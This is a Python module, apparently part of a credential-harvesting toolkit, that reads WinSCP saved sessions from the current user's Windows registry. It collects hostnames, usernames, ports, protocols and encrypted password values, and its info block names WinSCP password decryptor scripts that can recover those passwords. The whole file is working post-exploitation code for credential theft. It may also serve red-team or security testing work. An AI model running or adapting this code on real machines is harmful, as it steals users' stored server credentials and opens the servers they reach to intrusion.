#!/usr/bin/env python3
"""
WinSCP Credential Miner
Extract WinSCP saved sessions and passwords
"""

import winreg
from typing import List, Dict

from ..utils import safe_open_key, safe_query_value, enumerate_subkeys


class WinSCPMiner:
    """
    Extract WinSCP saved sessions
    
    Location: HKCU\Software\Martin Prikryl\WinSCP 2\Sessions
    Privilege: Current user access
    """
    
    MINER_NAME = "winscp"
    REQUIRES_ADMIN = False
    
    def __init__(self):
        self.key_path = r"Software\Martin Prikryl\WinSCP 2\Sessions"
    
    def mine(self) -> List[Dict]:
        """
        Extract WinSCP sessions
        
        Returns:
            List of credential dictionaries
        """
        print(f"\n[*] Mining WinSCP sessions...")
        print(f"[*] Location: HKCU\\{self.key_path}")
        
        credentials = []
        
        key = safe_open_key(winreg.HKEY_CURRENT_USER, self.key_path)
        
        if not key:
            print(f"[-] No WinSCP sessions found")
            return credentials
        
        try:
            # Enumerate session names
            session_names = enumerate_subkeys(key)
            
            if not session_names:
                print(f"[-] No saved WinSCP sessions found")
                return credentials
            
            print(f"[+] Found {len(session_names)} WinSCP session(s)")
            
            for session_name in session_names:
                session_key = safe_open_key(key, session_name)
                
                if not session_key:
                    continue
                
                try:
                    session_data = {
                        'source': 'WinSCP Session',
                        'location': f'HKCU\\{self.key_path}\\{session_name}',
                        'session_name': session_name
                    }
                    
                    # Extract hostname
                    hostname_result = safe_query_value(session_key, "HostName")
                    if hostname_result:
                        session_data['hostname'] = hostname_result[0]
                    
                    # Extract username
                    username_result = safe_query_value(session_key, "UserName")
                    if username_result:
                        session_data['username'] = username_result[0]
                    
                    # Extract port
                    port_result = safe_query_value(session_key, "PortNumber")
                    if port_result:
                        session_data['port'] = port_result[0]
                    
                    # Extract protocol
                    protocol_result = safe_query_value(session_key, "FSProtocol")
                    if protocol_result:
                        protocol_map = {0: 'SFTP', 1: 'SCP', 5: 'FTP', 6: 'WebDAV'}
                        session_data['protocol'] = protocol_map.get(protocol_result[0], 'Unknown')
                    
                    # Extract encrypted password
                    password_result = safe_query_value(session_key, "Password")
                    if password_result:
                        session_data['password_encrypted'] = password_result[0]
                    
                    # Only add if we found useful information
                    if len(session_data) > 3:
                        credentials.append(session_data)
                        
                        print(f"[+] Found WinSCP session:")
                        print(f"    Session: {session_name}")
                        
                        if 'hostname' in session_data:
                            print(f"    Host: {session_data['hostname']}")
                        
                        if 'username' in session_data:
                            print(f"    Username: {session_data['username']}")
                        
                        if 'protocol' in session_data:
                            print(f"    Protocol: {session_data['protocol']}")
                        
                        if 'password_encrypted' in session_data:
                            print(f"    Note: Password encrypted (master password required)")
                
                finally:
                    winreg.CloseKey(session_key)
        
        finally:
            winreg.CloseKey(key)
        
        return credentials
    
    @staticmethod
    def get_info() -> Dict:
        """Get information about this miner"""
        return {
            'name': 'winscp',
            'description': 'Extract WinSCP saved session information',
            'requires_admin': False,
            'requires_system': False,
            'registry_location': r'HKCU\Software\Martin Prikryl\WinSCP 2\Sessions',
            'credential_types': ['hostname', 'username', 'encrypted password'],
            'notes': [
                'WinSCP stores session configuration in registry',
                'Hostnames and usernames stored in plaintext',
                'Passwords encrypted with master password',
                'Decryption requires master password or vulnerability exploit',
                'Current user access only'
            ],
            'decryption_tools': [
                'WinSCP password decryptor scripts',
                'winscppasswd.py'
            ]
        }